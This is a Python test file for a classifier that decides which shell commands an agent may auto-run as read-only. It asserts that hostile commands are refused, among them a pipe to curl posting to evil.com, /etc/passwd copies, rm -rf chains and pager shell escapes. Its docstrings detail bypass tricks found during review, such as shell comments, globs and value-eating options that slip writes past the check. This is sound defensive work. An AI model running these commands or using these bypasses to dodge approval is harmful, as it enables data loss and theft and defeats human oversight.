        assert is_read_only_bash("yarn clean --help") is False
        assert is_read_only_bash("npm run --help") is False
        assert is_read_only_bash("pnpm build --help") is False
        assert is_read_only_bash("npx payload --help") is False

    def test_help_probe_still_vouches_for_an_ordinary_probe(self):
        """The positive rule must not cost the cases the classifier exists for.

        A real program name may carry dots, digits, `+` and `-`, so those stay
        acceptable: `python3.12 --help` and `g++ --help` are probes.
        """
        assert is_read_only_bash("git --help") is True
        assert is_read_only_bash("git status --help") is True
        assert is_read_only_bash("ls --help") is True
        assert is_read_only_bash("cargo build --help") is True
        assert is_read_only_bash("python3.12 --help") is True
        assert is_read_only_bash("apt-get --help") is True
        assert is_read_only_bash("g++ --help") is True

    def test_help_probe_allowlists_the_subcommand_form(self):
        """The three-token form is the dangerous one, so it is allowlisted.

        There the middle token is indistinguishable from an operand, so a program
        that treats it as a script RUNS it. The denied-program table cannot answer
        that: it matches EXACTLY, and the spellings a real system installs
        (`python3.12`, `perl5.36`, `node20`, `sh.exe`, `g++-13`) are unbounded, so
        no list of rejects closes it.
        """
        assert is_read_only_bash("python3.12 payload --help") is False
        assert is_read_only_bash("python2.7 payload --help") is False
        assert is_read_only_bash("perl5.36 payload --help") is False
        assert is_read_only_bash("node20 payload --help") is False
        assert is_read_only_bash("sh.exe payload --help") is False
        assert is_read_only_bash("g++-13 payload --help") is False
        # A program not on the allowlist is not BLOCKED — its two-token probe
        # still works, and only the subcommand form asks for a human.
        assert is_read_only_bash("python3.12 --help") is True
        assert is_read_only_bash("g++ --help") is True
        # The allowlisted programs keep their subcommand probe.
        assert is_read_only_bash("git log --help") is True
        assert is_read_only_bash("cargo build --help") is True
        assert is_read_only_bash("terraform plan --help") is True

    def test_help_probe_allowlist_excludes_operand_acting_programs(self):
        """Membership means "an unknown subcommand is an ERROR", not "a file".

        For an archiver the middle token is a mode letter and the operands are
        files it reads or writes, so the three-token form is not a usage probe:
        `tar xf …` extracts and `zip …` creates. `openssl <cmd>` reads a key the
        same way. Their two-token probe is unaffected.
        """
        assert is_read_only_bash("tar xf --help") is False
        assert is_read_only_bash("tar cf --help") is False
        assert is_read_only_bash("zip -r --help") is False
        assert is_read_only_bash("unzip -l --help") is False
        assert is_read_only_bash("openssl x509 --help") is False
        assert is_read_only_bash("tar --help") is True

    def test_help_probe_rejects_a_program_named_by_path(self):
        """An unlisted binary may ignore `--help` and run its side effect.

        The denied-program table can only name executors it knows about, so a
        path-named program has to fail on shape instead: nothing here can be
        vouched for.
        """
        assert is_read_only_bash("./payload --help") is False
        assert is_read_only_bash("./evil.sh --help") is False
        assert is_read_only_bash("/tmp/payload --help") is False
        assert is_read_only_bash("../build/tool --help") is False
        assert is_read_only_bash("./x --version") is False
        assert is_read_only_bash("/usr/local/bin/unknown --help") is False

    def test_help_probe_does_not_accept_short_h(self):
        """`-h` is not accepted — it collides with real options and halt semantics."""
        assert is_read_only_bash("some-tool subcmd -h") is False
        assert is_read_only_bash("some-tool -h") is False

    def test_help_probe_rejects_unparseable_and_prefixed_forms(self):
        """Deny-by-default when argv cannot be recovered or is not a probe."""
        # Unbalanced quote: argv is unknown, so the segment is not vouched for.
        assert is_read_only_bash('some-tool "--help') is False
        # A VAR=value prefix assigns into the command's environment.
        assert is_read_only_bash("LD_PRELOAD=/tmp/x.so --help") is False
        # More than one operand between program and flag.
        assert is_read_only_bash("npm run deploy --help") is False
        # An option, not a bare subcommand, in the middle.
        assert is_read_only_bash("some-tool -f /etc/shadow --help") is False

    def test_compound_read_commands(self):
        assert is_read_only_bash("git status && git log --oneline -3") is True
        assert is_read_only_bash("ls -la; echo done") is True

    def test_redirections_rejected(self):
        assert is_read_only_bash("echo payload > /etc/file") is False
        assert is_read_only_bash("cat /etc/passwd > /tmp/exfil.txt") is False
        # Redirect to a real file stays unsafe even when it sits next to a
        # /dev/null sink — the scrub must not strip the real-file redirect.
        assert is_read_only_bash("grep x f 2>/dev/null > /tmp/out.txt") is False
        assert is_read_only_bash("echo hi >> /tmp/append.txt") is False

    def test_devnull_redirects_allowed(self):
        """Discard-only redirect idioms are read-only despite '>'/'&'."""
        assert is_read_only_bash("head -5 file.txt 2>/dev/null") is True
        assert is_read_only_bash("grep -r 'pattern' src/ 2>/dev/null") is True
        assert is_read_only_bash("ls /nonexistent >/dev/null") is True
        assert is_read_only_bash("cat file &>/dev/null") is True
        assert is_read_only_bash("wc -l /tmp/x 2>>/dev/null") is True
        assert is_read_only_bash("ls -la 2>&1") is True
        # Compound + pipe chains with a /dev/null sink stay read-only.
        assert is_read_only_bash("grep -r foo . 2>/dev/null | head -20") is True
        assert is_read_only_bash("ls /a 2>/dev/null; grep -r foo /b 2>/dev/null") is True

    def test_devnull_does_not_unlock_write_commands(self):
        """The /dev/null exemption must not allowlist a write/exec command."""
        assert is_read_only_bash("rm -rf /tmp/foo 2>/dev/null") is False
        assert is_read_only_bash("python script.py 2>/dev/null") is False
        assert is_read_only_bash("cat /etc/passwd > /tmp/exfil 2>/dev/null") is False

    def test_devnull_prefix_is_not_a_real_file_sink(self):
        r"""`/dev/null` must match the literal device, not a path prefix.

        Without the `(?![\w./-])` guard the scrub would strip the redirect in
        `>/dev/nullx` (a write to file `nullx`) and misclassify it read-only.
        """
        assert is_read_only_bash("echo x >/dev/nullx") is False
        assert is_read_only_bash("echo p > /dev/null/../../etc/passwd") is False
        assert is_read_only_bash("echo x &>/dev/nullfoo") is False
        assert is_read_only_bash("echo x 2>/dev/null.bak") is False

    def test_command_substitution_rejected(self):
        assert is_read_only_bash("echo $(rm -rf /)") is False
        assert is_read_only_bash("echo `whoami`") is False

    def test_process_substitution_rejected(self):
        assert is_read_only_bash("diff <(rm -rf /) <(echo x)") is False

    def test_background_operator_rejected(self):
        assert is_read_only_bash("ls & rm -rf /") is False
        assert is_read_only_bash("ls && cat file") is True  # && still works

    def test_pipe_chains(self):
        assert is_read_only_bash("grep -r 'foo' src/ | head -20") is True
        assert is_read_only_bash("cat file.txt | wc -l") is True
        assert is_read_only_bash("git log | grep 'fix'") is True

    def test_write_commands_rejected(self):
        assert is_read_only_bash("rm -rf /tmp/foo") is False
        assert is_read_only_bash("mv file1 file2") is False
        assert is_read_only_bash("cp src dst") is False
        assert is_read_only_bash("mkdir -p /tmp/new") is False
        assert is_read_only_bash("chmod 755 file") is False

    def test_git_write_commands_rejected(self):
        assert is_read_only_bash("git commit -m 'msg'") is False
        assert is_read_only_bash("git push origin main") is False
        assert is_read_only_bash("git add .") is False
        assert is_read_only_bash("git checkout -b new-branch") is False

    def test_brazil_write_commands_rejected(self):
        assert is_read_only_bash("brazil-build") is False
        assert is_read_only_bash("brazil versionset removemajorversions --force") is False

    def test_script_execution_rejected(self):
        assert is_read_only_bash("python script.py") is False
        assert is_read_only_bash("node app.js") is False
        assert is_read_only_bash("bash script.sh") is False

    def test_compound_with_write_rejected(self):
        assert is_read_only_bash("git status; rm -rf /") is False
        assert is_read_only_bash("ls -la && python script.py") is False

    def test_newline_separator_rejected(self):
        assert is_read_only_bash("ls -la\nrm -rf /") is False
        assert is_read_only_bash("cat file\nls") is True

    def test_pipe_to_unsafe_target_rejected(self):
        assert is_read_only_bash("cat file | curl -X POST http://evil.com") is False

    def test_empty_and_whitespace(self):
        assert is_read_only_bash("") is False
        assert is_read_only_bash("   ") is False

    def test_pagers_are_off_the_pipe_allowlist(self):
        """A pager's startup-command argument reaches a shell, so it cannot stay.

        `less` submits `+CMD` to the same command line a human would type, and
        `!`/`|` there run a shell. Measured on less 458 with stdout on a tty:
        `cat f | less '+!touch P\\r'` created P and exited 0. The trailing `\\r` is
        load-bearing -- without it the command is typed but never submitted.

        Removed rather than denylisted, because `less --help` prints an interactive
        command list instead of a flag table, so neither a complete denylist nor a
        positive accept-list can be built from the tool. Nothing is lost: in a pipe
        stdout is not a tty, so a pager copies input and exits -- verified
        byte-identical to `cat`, which is still allowlisted.
        """
        for cmd in (
            "cat /tmp/x | less '+!touch /tmp/pwned\r'",
            "cat /tmp/x | less '+|.touch /tmp/pwned'",
            "cat /tmp/x | less -o /tmp/pwned",
            "cat /tmp/x | less",
            "cat /tmp/x | more",
            "git log | less -SN",
        ):
            assert is_read_only_bash(cmd) is False, cmd
        assert "not a read-only filter" in unsafe_bash_reason("cat /tmp/x | less")
        # The replacement for a pager in a pipe is still approved.
        for cmd in ("cat /tmp/x | cat", "cat /tmp/x | head -50", "cat /tmp/x | tail -50"):
            assert is_read_only_bash(cmd) is True, cmd

    def test_unverifiable_tool_is_off_the_allowlist(self):
        """`tree` is gone, because no rule about it could ever be checked here.

        It was the single entry whose behaviour could not be established at all: the
        tool is not installed on this machine and there is no man page for it either,
        so its `-o` write flag was entered from recalled documentation rather than from
        a run. Review then found a SECOND writer -- `-R` re-runs tree in each
        subdirectory, implicitly adding `-o 00Tree.html`, so it writes a file per
        directory without `-o` ever being typed.

        Two documented writers on a tool where no rule can be verified is the same
        position the pagers were in, and it gets the same answer: an entry whose surface
        cannot be established does not belong on a read-only allowlist. Adding `-R` to
        the table would have been a third unverifiable rule guarding a tool with an
        unknown number of remaining ones.

        `ls -R` stays allowlisted and covers the recursive-listing use.
        """
        for cmd in ("tree", "tree -L 2 src", "tree -R .", "tree -L 1 -R .", "tree -o /tmp/x"):
            assert is_read_only_bash(cmd) is False, cmd
        assert "not on the read-only allowlist" in unsafe_bash_reason("tree -L 1 -R .")
        for cmd in ("ls -R", "ls -la", "ls -R src"):
            assert is_read_only_bash(cmd) is True, cmd

    def test_metadata_write_is_not_read_only(self):
        """`file -p` restores the access time, and restoring is still a WRITE.

        This one was admitted on a wrong argument: `--preserve-date` does not set a
        caller-chosen timestamp, it puts back the one that was already there, so it
        looked harmless. It is not. Restoring requires a `utimes()` call on the named
        path, and the `ctime` that call bumps is NOT restorable -- so the option erases
        the evidence that a file was read while leaving a permanent metadata
        modification behind. Wrong side of read-only in both directions.

        MEASURED, and the obvious test does not work here: `/tmp` is mounted `noatime`,
        so atime never advances and "did nothing" is indistinguishable from "restored a
        value that never changed". `ctime` advances on any inode metadata write and is
        visible whatever the mount options are:

            file t.txt            -> ctime unchanged   (control)
            file -b t.txt         -> ctime unchanged   (control)
            file -p t.txt         -> ctime ADVANCED
            file --preserve-date  -> ctime ADVANCED

        The same probe was run across every other accept-list flag that opens a named
        file -- `file -m/-k/-L/-s/-r`, `sort`, `sort -u`, `sort -k1`, `date -r`,
        `date -f`, with `cat` and `wc -l` as controls -- and all twelve are clean, so
        `-p` is the only member of this class rather than the first of several.
        """
        for cmd in (
            "file -p t.txt",
            "file --preserve-date t.txt",
            "file -pb t.txt",  # clustered, either order
            "file -bp t.txt",
        ):
            assert is_read_only_bash(cmd) is False, cmd
        assert "not a recognised read-only option" in unsafe_bash_reason("file -p t.txt")
        # The flags measured clean must all still read.
        for cmd in (
            "file t.txt",
            "file -b t.txt",
            "file -k t.txt",
            "file -L t.txt",
            "file -s t.txt",
            "file -r t.txt",
            "file -m /usr/share/misc/magic t.txt",
            "file -e ascii t.txt",
            "file --mime-type t.txt",
        ):
            assert is_read_only_bash(cmd) is True, cmd

    def test_shell_elided_tokens_cannot_forge_a_mode_flag(self):
        """A word the shell DELETES must not be able to vouch for the command.

        `shlex.split` tokenises but does not model token elision: bash drops words
        from argv that shlex keeps as ordinary tokens, so the token list is a strict
        SUPERSET of the real argv. Every conclusion resting on a token being PRESENT
        is therefore forgeable with a word the shell will throw away. Here `--list`
        made `_ref_list_flag_present` report list mode while bash never passed it.

        MEASURED end to end in a scratch repo -- classifier verdict AND the branch
        list before/after, because "the classifier allows it" and "it actually
        creates a ref" are two different claims:

            git branch injected # --list    -> rc=0, branch `injected` CREATED
            git tag forged # --list         -> rc=0, tag `forged` CREATED
            git branch injected <<< --list  -> rc=0, branch CREATED (no file needed)
            git branch injected < --list    -> rc=0, branch CREATED

        The `<` form needed a second attempt: the first probe returned rc=1 because
        no file named `--list` existed, so the redirect failed before git ran. That
        is the same missing-file harness trap as the earlier `hostname -F` probe --
        a failing control means the harness is wrong, not that the attack is dead.
        With the file present it creates the branch.

        Fixed at the root by refusing the constructs the classifier cannot model,
        not by teaching `_ref_list_flag_present` about comments. `>` was already
        refused outright, so refusing `<` is the symmetric treatment of the other
        direction. The cost is that `cat < f.txt` now prompts; it is rewritable.
        """
        for cmd in (
            "git branch injected # --list",
            "git tag forged # --list",
            "git branch injected < --list",
            "git branch injected << --list",
            "git branch injected <<< --list",
            "git branch injected <--list",  # attached form
            "git branch injected  #  --list",  # extra whitespace
        ):
            assert is_read_only_bash(cmd) is False, cmd
        assert "unsafe shell pattern" in unsafe_bash_reason("git branch injected # --list")
        # A `#` only starts a comment at a WORD START -- measured: `echo a#b` prints
        # `a#b`, `echo a # b` prints `a`. So a quoted `#` must still classify, or this
        # fix would silently cost every `grep '#include'`-shaped read.
        for cmd in (
            "grep '#include' f.c",
            "git log --grep='#1234'",
            "git branch --list",
            "git branch",
            "git log --oneline -5",
        ):
            assert is_read_only_bash(cmd) is True, cmd

    def test_extglob_operators_are_shell_rewrites(self):
        """`@(`, `!(` and `+(` are glob metacharacters too, and were missing.

        `_GLOB_RE` caught `*`, `?` and `[`, which already covered the `*(` and `?(`
        extglob operators as a side effect -- but not `@(`, `!(` or `+(`. Same defect
        as the plain-glob case: the token vetted is not the token git parses.

        MEASURED, with a file literally named `--output=pwned` in the tree:

            env BASHOPTS=extglob bash -c 'git diff @(--output=pwned)'
            -> rc=0, wrote `pwned`

        Two premises are recorded because they BOUND this rather than inflate it.
        Extglob is off by default in a non-interactive shell, and with it off `@(` is
        a SYNTAX ERROR rather than a literal -- verified in a clean tree that `pwned`
        is absent both before and after, since the first control run was contaminated
        by a leftover file from the positive case. `BASHOPTS` in the environment does
        enable it at startup (`shopt extglob` -> `on`). So the escape needs extglob
        enabled AND a matching file present.

        Closed anyway, because the cost is ZERO: no read spells an argument `@(...)`,
        and a bare `@`/`!`/`+` without the paren is untouched, so
        `git log --author=a@b.com` still classifies. (`git diff HEAD@{1}` is refused,
        but by the pre-existing `{` rule -- confirmed against the previous head, not
        introduced here.)

        Swept rather than patched: all 19 bash word-expansion forms were run against
        the classifier and these three were the only gaps.
        """
        for op in "@!+*?":
            cmd = f"git diff {op}(--output=pwned)"
            assert is_read_only_bash(cmd) is False, cmd
        assert "argument the shell expands" in unsafe_bash_reason("git diff @(--output=pwned)")
        # Bare `@`/`!`/`+` are not glob operators -- only the paren form is.
        for cmd in (
            "git log --author=a@b.com",
            "git log --grep=a+b",
            "git log --grep=hi!",
            "git diff origin/main...HEAD",
            "git diff",
            "git diff --stat",
            "git diff HEAD~1",
        ):
            assert is_read_only_bash(cmd) is True, cmd

    def test_indirect_file_list_is_not_read_only(self):
        """`file -f LIST` opens paths that never appear in the command.

        Not a write -- an INDIRECTION. The hook layer applies `is_sensitive_path` /
        `is_sensitive_bash_command` to the command text, so it can see `LIST` and
        nothing else, while `file` goes on to open every path named inside it. A guard
        that inspects argv is blind to one more level of indirection, so the option is
        removed rather than the guard made cleverer.

        `sort --files0-from` was already excluded for the same shape, and
        `hostname -F/--file` is already refused as a setter -- so this closes the last
        member of the class rather than a one-off.

        Options whose value IS the thing used stay allowed: `-m/--magic-file`,
        `-e/--exclude` and `-F/--separator` all appear in argv where the guards can act
        on them, with no second level to hide behind.
        """
        for cmd in ("file -f list", "file -flist", "file --files-from list"):
            assert is_read_only_bash(cmd) is False, cmd
        assert "not a recognised read-only option" in unsafe_bash_reason("file -f list")
        for cmd in (
            "file /etc/hosts",
            "file -bi /etc/hosts",
            "file -m /usr/share/misc/magic /etc/hosts",
            "file -e ascii /etc/hosts",
            "file --mime-type /etc/hosts",
        ):
            assert is_read_only_bash(cmd) is True, cmd

    def test_platform_divergent_letters_are_not_read_only(self):
        """The same LETTER can read on one platform and write on another.

        Every other rule here was enumerated from the tool installed on the machine
        this was written on, which is GNU. That is sound for a version axis -- a flag
        added later costs a prompt -- but not for a PLATFORM axis, where a letter can
        mean something else entirely. `date -d` is the case: GNU `--date=STRING` prints
        (verified, coreutils 8.22), while BSD/macOS `date -d` sets the kernel's
        daylight-saving value. This module ships to macOS.

        HONEST PROVENANCE: the BSD half is documentation-sourced. There is no macOS on
        the box this was written on, so unlike the rest of this suite it is not backed
        by an execution.

        Dropped rather than gated on `sys.platform`, because the platform does not
        reliably predict the implementation -- macOS with brew coreutils ahead on PATH
        has GNU `date` -- so a platform test would look like a check while still being
        a guess. Dropping is correct everywhere.

        The other three accept-lists were swept for the same divergence: BSD `sort`
        writes with `-o`/`-T` and BSD `file` with `-C`, all already excluded, and BSD
        `hostname` offers only `-f`/`-s` plus a name operand that `operands="none"`
        already refuses. BSD `date`'s other setters (`-t`, `-j`, `-n`, `-v`) are absent
        from the list too, so they fail closed without a change.
        """
        for cmd in (
            "date -d 1",
            "date -d yesterday",
            "date -dyesterday",  # attached value
            "date -u -d now",  # not first token
            # BSD setters that were never on the list -- asserted so the sweep is
            # recorded rather than remembered.
            "date -t 5",
            "date -j",
            "date -v +1d",
        ):
            assert is_read_only_bash(cmd) is False, cmd
        assert "not a recognised read-only option" in unsafe_bash_reason("date -d 1")
        # The long form is the mitigation and must keep working. It is safe by
        # construction: BSD `date` has no long options, so there it errors instead.
        for cmd in (
            "date --date=yesterday",
            "date --date yesterday",
            "date -Iseconds",
            "date -r /tmp",
            "date -R",
            "date -u +%s",
            "date -f /tmp/dates",
        ):
            assert is_read_only_bash(cmd) is True, cmd

    def test_short_option_values_cannot_hide_ref_creation(self):
        """A MUTATING short option that takes a value eats a list flag too.

        The previous rule exempted every short option from the value-consumption
        check, justified on "no READ-only short of `git branch`/`git tag` takes a
        value". That was true and still missed the point: `git tag -F FILE NAME` takes
        the tag message from FILE, and it is a mutator. Verified -- with a file named
        `--list` present, `git tag -F --list injected` CREATED the tag, because `-F`
        ate the `--list` and the list-flag rule then read `injected` as a filter.

        Two independent closures now, because one of them is a table that can be
        incomplete: `-F` is in `_REF_OPTION_ONLY_MUTATORS`, AND the valueless-short
        list means an unrecognised short is treated as possibly-consuming. The second
        is the one that holds if a future value-taking short is missed.
        """
        for cmd in (
            "git tag -F --list injected",
            "git tag -F ./--list injected",
            "git tag -F msg.txt injected",
            "git tag -m --list injected",
            "git branch -u --list injected",
        ):
            assert is_read_only_bash(cmd) is False, cmd
        # Valueless shorts, singly and clustered, must still let a list flag count.
        for cmd in (
            "git branch -a --list x",
            "git branch -av --list x",
            "git branch -r --list x",
            "git branch -i --list x",
            "git tag -i -l v1",
        ):
            assert is_read_only_bash(cmd) is True, cmd
        # `-n[NUM]` is ATTACHED-only, so it never eats the next word: measured,
        # `git tag -n 5` treats `5` as the pattern while `git tag -n5 -l` prints
        # annotations. These are ordinary reads and must not have been caught.
        for cmd in ("git tag -n5 -l", "git tag -n -l", "git tag -n5 --list", "git tag -n5 -l v1"):
            assert is_read_only_bash(cmd) is True, cmd

    def test_ref_list_mode_cancellation_is_not_a_bypass(self):
        """A later token can turn a list mode back OFF, so this is a fold not a search.

        git applies these options left to right and the last wins. Returning True at
        the FIRST list flag accepted `git branch --list --no-list injected`, which
        created the branch (verified). Measured, for contrast,
        `--list --no-list --list injected` creates nothing.

        The cancellers are prefix-matched because git abbreviates a BOOLEAN long
        option: `--no-lis` and `--no-li` both cancelled and both created the ref. Its
        value-taking options behave differently (`git diff --outp F` errors instead of
        writing), so this is specifically about booleans.

        `--no-contains` and `--no-merged` are NOT cancellers -- they are list modes in
        their own right, verified by creating nothing with an operand present. The
        canceller set is derived from `_REF_LIST_FLAGS` minus those, so it cannot drift
        as the flag set changes.
        """
        from kiro_crew.dashboard.state import _REF_LIST_CANCELLERS

        assert _REF_LIST_CANCELLERS == {"--no-list", "--no-points-at"}
        for cmd in (
            "git branch --list --no-list injected",
            "git branch --list --no-lis injected",  # git abbreviates booleans
            "git branch --list --no-li injected",
            "git branch -l --no-list injected",
            "git branch --no-list injected",
            "git branch --points-at HEAD --no-points-at injected",
            "git tag --list --no-list injected",
        ):
            assert is_read_only_bash(cmd) is False, cmd
            assert "creates a ref" in unsafe_bash_reason(cmd), cmd
        # Every listing form measured to create nothing still reads.
        for cmd in (
            "git branch --list",
            "git branch -l",
            "git branch --list feat-x",
            "git branch --contains HEAD",
            "git branch --no-contains HEAD",  # a filter, not a cancellation
            "git branch --no-merged",
            "git branch --points-at HEAD",
            "git branch --list --no-color x",  # unrelated `--no-` is not a canceller
            "git branch -a --list x",
            "git branch --format=x --list y",
        ):
            assert is_read_only_bash(cmd) is True, cmd
        # DELIBERATELY STRICTER THAN GIT, in the safe direction: git creates no ref for
        # `--list --no-list --list injected`, but the third `--list` follows a long
        # option with no `=`, so the value-consumption rule cannot rule out that it was
        # eaten. Recognising it would need git's value-taking options enumerated, which
        # fails open on omission. Costs a prompt on a form nobody writes.
        assert is_read_only_bash("git branch --list --no-list --list injected") is False

    def test_declared_input_only_tools_were_audited(self):
        """The first `_OPERANDS_ARE_INPUTS` draft was wrong; this pins the audit.

        That set was written as "the status quo, not individually verified", and review
        found `file` in it: `file -C -m ./magic` compiles the magic file and writes
        `magic.mgc` (verified, 464 bytes). Auditing the REST of the set rather than
        just that entry found three more, every one the helper-execution class already
        closed for `git log/diff/show`:

            git cat-file --textconv  -> ran a configured helper
            git cat-file --filters   -> ran a configured smudge filter
            git blame    --textconv  -> ran a configured helper

        `git blame --textconv` is the one worth remembering: it is NOT in
        `git blame --help`. Only execution found it, so for git the help text is not an
        authoritative list of accepted options -- which is why the exec-flag table is
        applied to every git prefix rather than to the ones whose help mentions it.
        """
        from kiro_crew.dashboard import state as st

        for cmd in (
            "file -C -m ./magic",
            "file --compile -m ./magic",
            "git cat-file --textconv HEAD:f",
            "git cat-file --filters HEAD:f",
            "git blame --textconv f.py",
        ):
            assert is_read_only_bash(cmd) is False, cmd
        assert "not a recognised read-only option" in unsafe_bash_reason("file -C -m ./m")
        assert "external helper" in unsafe_bash_reason("git blame --textconv f.py")
        # Generalised to every git prefix, including ones whose help does not mention
        # the flag. Refusing a flag a subcommand rejects anyway costs no working read.
        for cmd in ("git status --textconv", "git ls-files --filters", "git describe --ext-diff"):
            assert is_read_only_bash(cmd) is False, cmd
        assert len(st._HELPER_EXEC_FLAGS_BY_PREFIX) == sum(
            1 for p in st._READ_ONLY_BASH_PREFIXES if p == "git" or p.startswith("git ")
        ), "every allowlisted git prefix must inherit the helper-exec refusal"
        # `file`'s ordinary identify forms still read, including clustered shorts and
        # a `-m` value, which is what an accept-list has to get right.
        for cmd in (
            "file /etc/hosts",
            "file -b /etc/hosts",
            "file -i /etc/hosts",
            "file -bi /etc/hosts",
            "file -L -k /etc/hosts",
            "file --mime-type /etc/hosts",
            "file -m /usr/share/misc/magic /etc/hosts",
        ):
            assert is_read_only_bash(cmd) is True, cmd
        # And the git reads that motivated allowlisting these subcommands at all.
        for cmd in (
            "git blame file.py",
            "git cat-file -p HEAD",
            "git status",
            "git rev-parse HEAD",
            "git ls-files",
            "git ls-tree HEAD",
            "git describe --tags",
        ):
            assert is_read_only_bash(cmd) is True, cmd

    def test_every_allowlisted_prefix_has_an_argument_story(self):
        """A new allowlist entry cannot silently skip argument vetting.

        The defect this change fixes is "the head matched, so the arguments were never
        looked at". Fixing the current entries does not stop the next one re-opening
        it: a one-line addition to `_READ_ONLY_BASH_PREFIXES` would be auto-approved
        with no vetting and nothing would complain.

        So every prefix must be accounted for by exactly one story -- an exact-only
        probe, a positive accept-list, a per-tool table, or an explicit declaration
        that its arguments are inputs. Adding a prefix without choosing one turns this
        red, which is the cheap durable guard: the obligation is enforced rather than
        remembered.

        Deliberately structural. It asserts that a DECISION was recorded, not that the
        decision was correct -- no test can check the latter, and pretending otherwise
        would be worse than saying so.
        """
        from kiro_crew.dashboard import state as st

        stories = {
            "exact-only probe": frozenset(st._EXACT_ONLY_BASH_PREFIXES),
            "accept-list": frozenset(st._OPTION_ACCEPT_LISTS),
            "write-flag table": frozenset(st._WRITE_FLAGS_BY_PREFIX),
            "helper-exec table": frozenset(st._HELPER_EXEC_FLAGS_BY_PREFIX),
            "ref-mutating": frozenset(st._REF_MUTATING_PREFIXES),
            "read-subcommands": frozenset(st._SUBCOMMAND_READ_ONLY),
            "operands are inputs": _OPERANDS_ARE_INPUTS,
        }
        unaccounted = [
            p
            for p in st._READ_ONLY_BASH_PREFIXES
            if not any(p in group for group in stories.values())
        ]
        assert not unaccounted, (
            f"{len(unaccounted)} allowlisted prefix(es) have no argument story: "
            f"{unaccounted}. Add a vetting rule, or add to _OPERANDS_ARE_INPUTS if "
            f"the arguments really are only inputs."
        )
        # And nothing may be declared an input-only tool while also carrying a rule
        # that says its arguments can act -- that would be a contradiction a reader
        # could not resolve.
        acting = (
            stories["write-flag table"]
            | stories["helper-exec table"]
            | stories["ref-mutating"]
            | stories["accept-list"]
            | stories["exact-only probe"]
        )
        contradictory = sorted(_OPERANDS_ARE_INPUTS & acting)
        assert (
            not contradictory
        ), f"declared input-only but also vetted as able to act: {contradictory}"
        # Guard against the declaration drifting into fiction: everything named must
        # actually be on the allowlist.
        stale = sorted(_OPERANDS_ARE_INPUTS - frozenset(st._READ_ONLY_BASH_PREFIXES))
        assert not stale, f"_OPERANDS_ARE_INPUTS names non-allowlisted prefixes: {stale}"

    def test_consumed_option_values_are_not_a_bypass(self):
        """A value-taking option eats the next word, whatever that word looks like.

        Two syntactic markers this classifier relied on can therefore be swallowed,
        and both were verified to land a real effect:

        * `--`, taken as a value, is not a separator. `git log --decorate-refs --
          --output=victim` OVERWROTE victim with log output, because `--` became the
          decorate pattern and `--output=` was then an ordinary option.
        * a list-mode flag, taken as a value, is not a list mode -- so the operand it
          was vouching for is a ref NAME. `git branch --format --list injected`
          CREATED the branch `injected`.

        Fixed without enumerating git's value-taking options, which is large enough
        that getting it wrong would fail OPEN: the write-flag scan simply reads every
        token including past `--`, and a list flag is disqualified when the token
        before it is a long option with no attached `=` (any such option might consume
        it). Short options are exempt, since no read-only short option of
        `git branch`/`git tag` takes a value.
        """
        for cmd in (
            "git log --decorate-refs -- --output=/tmp/victim",
            "git log --grep -- --output=/tmp/victim",
            "git show --format -- --output=/tmp/victim",
            "git diff --src-prefix -- --output=/tmp/victim",
            "git log --decorate-refs -- --ext-diff",
            "git branch --format --list injected",
            "git tag --format --list injected",
            "git branch --sort --list injected",
            "git branch --format -- -dsomebranch",
        ):
            assert is_read_only_bash(cmd) is False, cmd
        assert "writes to an arbitrary path" in unsafe_bash_reason(
            "git log --decorate-refs -- --output=/tmp/v"
        )
        assert "creates a ref" in unsafe_bash_reason("git branch --format --list injected")
        # The list-flag rule must not over-reach onto the ordinary listing forms.
        for cmd in (
            "git branch --list feat-x",
            "git branch -a --list x",  # short options do not consume
            "git branch --format=x --list y",  # attached `=` cannot consume
            "git branch --contains HEAD",
            "git tag -l v1",
            "git branch -a",
            "git tag",
        ):
            assert is_read_only_bash(cmd) is True, cmd
        # HARDENING, not a fix, on the accept-list path: every value-taking read flag
        # of this box's `sort` rejects `--` and aborts, so these wrote nothing before
        # either. Closed anyway rather than depending on another tool's argument
        # validation, since the git path proved a permissive tool does write.
        for cmd in ("cat f | sort -k -- -o /tmp/x", "cat f | sort -S -- -o /tmp/x"):
            assert is_read_only_bash(cmd) is False, cmd

    def test_pipe_assignment_prefix_is_not_a_bypass(self):
        """`VAR=value cmd` after a pipe is a command, not a filter invocation.

        `_READ_ONLY_PIPE_RE` used `\\b` after the filter name, and `=` satisfies a
        word boundary -- so `sort=1 sh payload` matched on `sort`. `shlex` then
        reported a head of `sort=1`, every check keyed off that head recognised
        nothing, and the target was auto-approved un-vetted. Verified: bash assigns
        into the environment and runs `sh payload`, which executed.

        Two layers, because the pattern alone only closes the spellings we thought
        of. `(\\s|$)` refuses the shape -- the same strictness the head path always
        had via `startswith(p + " ")`, which is why the head path was never reachable
        this way, and which `_is_help_probe` already applied to `VAR=value` too. And
        `_pipe_target_violation` now fails CLOSED when the shlex head is not literally
        one of the filters, so a future divergence between the pattern and the
        tokenizer cannot silently skip validation again.
        """
        for name in ("sort", "uniq", "cat", "grep", "head", "wc", "cut"):
            cmd = f"cat f | {name}=1 sh payload"
            assert is_read_only_bash(cmd) is False, cmd
        for cmd in (
            "cat f | sort=1 sh payload",
            "cat f | uniq=$(id) sh p",
            "cat f | cat=1 bash -c id",
            "cat f | sort'x' payload",
            "cat f | sort-u payload",
        ):
            assert is_read_only_bash(cmd) is False, cmd
        assert "not a read-only filter" in unsafe_bash_reason("cat f | sort=1 sh payload")
        # Every ordinary filter invocation still reads, including extra whitespace.
        for cmd in (
            "cat f | sort",
            "cat f | sort -u",
            "cat f|sort",
            "cat f |   sort  -u",
            "cat f | grep -i x",
            "cat f | egrep x",
            "cat f | fgrep x",
            "cat f | head -5",
            "cat f | tail -20",
            "cat f | wc -l",
            "cat f | cut -f1",
            "cat f | cat",
            "cat f | uniq -c",
            "du -a | sort -rn | head -20",
            "git log | sort | uniq -c",
        ):
            assert is_read_only_bash(cmd) is True, cmd

    def test_globbed_option_token_is_not_a_bypass(self):
        """A glob synthesizes OPTIONS, not just extra operands.

        The operand-count reasoning that first admitted globs was half the story.
        Measured: with a file named `--output=pwned` in the tree and `pwned` a
        symlink to a victim file, `git diff --out*` expanded to `--output=pwned`
        and git truncated the symlink target -- while the spelled-out
        `git diff --output=pwned` was already refused. A flag table cannot be
        trusted on a token the shell has yet to rewrite.
        """
        for cmd in (
            "git diff --out*",
            "git log --out*",
            "git show --out*",
            "git diff --outp?t=pwned",
            # No leading dash: the glob still resolves to an option token, so a
            # rule that only inspected dash-led tokens would miss this.
            "git diff *utput=pwned",
        ):
            assert is_read_only_bash(cmd) is False, cmd
        assert "shell expands" in unsafe_bash_reason("git diff --out*")
